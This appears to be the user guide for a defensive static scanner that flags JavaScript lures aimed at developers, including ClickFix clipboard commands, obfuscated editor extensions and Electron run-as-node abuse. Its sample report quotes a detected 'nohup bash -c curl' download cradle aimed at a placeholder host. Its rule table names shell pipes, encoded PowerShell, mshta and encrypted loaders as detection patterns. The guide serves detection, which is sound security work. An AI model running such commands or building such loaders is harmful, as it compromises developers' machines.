# unk-scanner user guide

`unk-scanner` is a static triage tool for JavaScript that arrives through developer-targeting lures: fake job-interview repositories, malicious editor extensions and "verify you are human" pages that put a command on the clipboard. It parses a file, partially evaluates the parts that are safe to evaluate, and reports what the code is set up to do, with a severity and an exact source location. It never runs the input.

The tool came out of the [UNK_DeadDrop investigation](https://krasforge.github.io/UNK_DeadDrop/), where the same questions kept recurring: what does this page actually copy, which strings is this obfuscated extension hiding, and does this code launch the editor binary as a general Node interpreter? Answering them by hand took hours per sample. This guide covers version 0.2.0.

## What it finds

| Finding | Severity | What it means |
| --- | --- | --- |
| `clickfix-clipboard-command` | error, or warning for a plain install command | A clipboard write whose value is a terminal command: pipes into a shell, download cradles, hidden or encoded PowerShell, `mshta`, detaching. Errors when the write replaces a copy event, carries verification wording or hides execution |
| `electron-run-as-node` | warning, error with hidden execution | A process launched with `ELECTRON_RUN_AS_NODE`, which makes a signed editor binary run arbitrary Node code (ATT&CK T1218.015) |
| `string-array-obfuscation` | warning | An obfuscator.io-style string array, with whether its strings were recovered |
| `encrypted-loader` | error | Embedded base64, AES-256-GCM decryption and `Module._compile` linked together |
| `child-process-hidden-script` | warning | A script launched from a temporary or `.vscode` directory |
| `clipboard-write`, `clipboard-copy-override`, `obfuscated-string-indicator`, `campaign-marker` | note | Context: ordinary clipboard use, copy handlers, URLs and modules recovered from obfuscation, investigation markers |

Every finding is a lead for review, not a verdict, and an empty report does not mean a file is safe. Severities were calibrated so that patterns legitimate software uses routinely stay below error. Across 143,153 files from the 2,500 most downloaded npm packages and 500 most downloaded Open VSX extensions, no error-level finding occurred ([benchmark](../BENCHMARK.md)). The [rule reference](rules.md) gives each rule's exact conditions.

## Install

Node.js 22 or later is required for both distributions.

```sh
npm install --global unk-scanner --ignore-scripts
# or
python -m pip install unk-scanner
```

Both install an `unk-scanner` command. With Python, `python -m unk_scanner` selects that installation explicitly, and `unk_scanner.scan(path)` returns the report as a dictionary.

## Quick start

```sh
unk-scanner suspicious.js                              # one report as JSON
unk-scanner ./unpacked-extension/                      # every .js/.mjs/.cjs file
unk-scanner --include-node-modules ./unpacked-vsix/    # include bundled dependencies
unk-scanner --format sarif --fail-on error src/ > results.sarif
```

A VSIX is a ZIP archive. Unpack it into a scratch directory first, for example with `unzip -d ./unpacked-vsix extension.vsix`, and scan the `extension/` folder. For a gzip-compressed HTTP response body, use `unk-scanner --gzip body.js`.

Exit code 0 means analysis completed. Exit code 1 means a finding reached the `--fail-on` level. Exit code 2 means an error, such as invalid arguments, an unreadable or unparseable file, or, with `--strict`, any file that could not be analysed.

## Reading a report

A single file produces one JSON report:

```json
{
  "schemaVersion": 2,
  "sha256": "…",
  "bytes": 691,
  "findings": [
    {
      "kind": "clickfix-clipboard-command",
      "severity": "error",
      "line": 13,
      "column": 3,
      "detail": "download-cradle, detached-exec, copy-event-override, verification-lure-text: nohup bash -c \"curl -ks https://example.invalid/demo …",
      "indicators": ["download-cradle", "detached-exec", "copy-event-override", "verification-lure-text"],
      "resolved": true
    }
  ],
  "deobfuscation": [],
  "artifactMatches": [],
  "limitations": ["…"]
}
```

The report has these parts:

- **`sha256` and `bytes`:** identify the exact bytes analysed. Record them with your notes.
- **`findings`:** sorted by position. `resolved: true` means the scanner computed the exact copied value. `false` means it collected string fragments from the code that builds the value, and the detail says whether they came from builder code or from callers of a copy helper.
- **`deobfuscation`:** one entry per string array, giving its variant, offset, rotation, the method that proved the rotation, and how many call sites were decoded.
- **`artifactMatches`:** exact-hash identity for a few retained investigation files. This is kept separate from findings.

Several files produce `{ schemaVersion, tool, isolation, files: [...] }`. The `isolation` object records which protections were applied.

## Walkthrough

The [demo fixtures](../examples/arsenal/) are inert and safe to scan.

**ClickFix (`02-clickfix.js`).** A copy handler cancels the user's copy and puts a built command on the clipboard instead. The command is assembled by two helper functions and never appears as one literal. The scanner evaluates the helpers, which contain nothing but string operations, and reports the exact command with the indicators it matched. Compare `01-copy-button.js`: a documentation copy button produces only a note.

When the value cannot be computed, for example because it depends on the visitor's operating system, the rule falls back to collecting text fragments. It gathers them from the builder functions, from objects of builder functions, and from the arguments that callers pass to a generic `copyText(text)` helper. All three retained UNK_DeadDrop lure generations are caught this way, including one that hides the command behind such a helper.

**Hidden strings (`03-string-array.js`).** obfuscator.io replaces strings with calls such as `_0xw(0x1b3, 'k!')` into an encoded, rotated array. Before the program starts, a small loop shifts the array until a checksum of decoded values equals a constant written in the file. The scanner works in four steps:

1. It reads the decoder's syntax to learn the variant (plain, base64 with the file's own alphabet, or RC4) and the index offset.
2. It reimplements the decoding.
3. It evaluates the checksum loop's expression for each candidate rotation and takes the first that matches, as the program itself would.
4. It substitutes the recovered strings everywhere, so every other rule sees them.

In the fixture it recovers rotation 9 and reports the hidden URL and `require('child_process')`. On the retained UNK_DeadDrop extension it arrives at rotation 391 and decodes 2,139 of 2,140 call sites in under a second. That is the same rotation found during the original manual analysis.

If a rotation loop exists but cannot be solved, the array is reported as unresolved. Decoding under a guessed rotation would produce plausible but false strings.

**Electron (`04-language-client.js` and `05-hidden-launch.js`).** Language clients, the TypeScript server and CLI shims legitimately launch the editor binary with `ELECTRON_RUN_AS_NODE`, so that alone is a warning. The UNK_DeadDrop Windows branch writes a PowerShell script that sets the variable and runs it with a hidden window. The scanner raises the finding to an error when the same file hides execution in this way.

## Safety model

The input is parsed, not run. "Evaluation" here means the scanner interprets a fixed subset of side-effect-free expressions in its own code:

- literals, arithmetic and string operations;
- `const` bindings and literal objects;
- small helper functions that return a single expression.

Anything else stays unresolved. Each evaluation is limited in steps and depth.

The command line also parses every file in a separate Node process that runs under these controls:

- the Node permission model, with no file writes, no child processes, no workers or addons, and reads limited to the scanner's own code;
- code generation from strings disabled;
- a 512 MiB heap and an empty environment;
- a per-file deadline (10 s by default) that replaces the process if a file stalls it;
- on Linux, where permitted, an empty network namespace and resource limits.

A crash or timeout affects only that file's result.

These controls reduce the damage a parser defect could do. They are not a sandbox against a V8 exploit, so analyse hostile samples on a disposable machine or VM that holds no credentials. The JavaScript API, `inspect(source)`, runs in your own process without isolation. Reports can contain strings from the input, so handle them with the input's sensitivity.

## CI and code scanning

`--format sarif` produces SARIF 2.1.0. GitHub code scanning displays it as alerts with rule descriptions, ATT&CK tags and severities. `--fail-on error` fails a build on error-level findings only. The [CI guide](ci.md) has a ready GitHub Actions workflow and a pre-commit hook. Directory scans skip `node_modules` unless `--include-node-modules` is given.

## Writing rules

Rules are small modules with an `id`, a default severity and a `create(context)` function that returns visitors for syntax-tree node types, in the style of ESLint. The context gives rules what the built-in rules use:

- folded and recovered string values;
- pure evaluation;
- member names;
- clipboard and copy-handler helpers;
- the deobfuscation summary.

Load your own rules with `--rule ./my-rule.mjs`. The isolated process may read only the named rule file. [rules.md](rules.md) has a complete example.

## Limitations

- **Parsing:** TypeScript and JSX are not parsed. Published packages usually ship compiled JavaScript, which is.
- **Evaluation:** no general data flow or reachability. A finding in a function that is never called is still reported.
- **String arrays:** recovery covers obfuscator.io-style plain, base64 and RC4 arrays. Arrays reached through reassignable `var` aliases are reported as unresolved.
- **What it cannot show:** whether a page displayed different text from what it copied, whether code ran, or whether anything was collected. Those need a browser or endpoint telemetry.
- **Benchmark scope:** the benchmark used popular published packages, a convenience sample. It calibrates severities; it is not a false-positive rate for your own code population.
- **Origin of the rules:** the investigation's own artifacts shaped the rules. Their detection on those artifacts shows coverage, not performance on future variants.

## Project

The source, rules, tests and benchmark are in the [companion repository](https://github.com/KrasForge/unk-deaddrop-companion). The original code is MIT licensed, and Acorn retains its own license. Background on the campaign is in the [research series](https://krasforge.github.io/UNK_DeadDrop/) and the [preprint](https://doi.org/10.5281/zenodo.23652297).
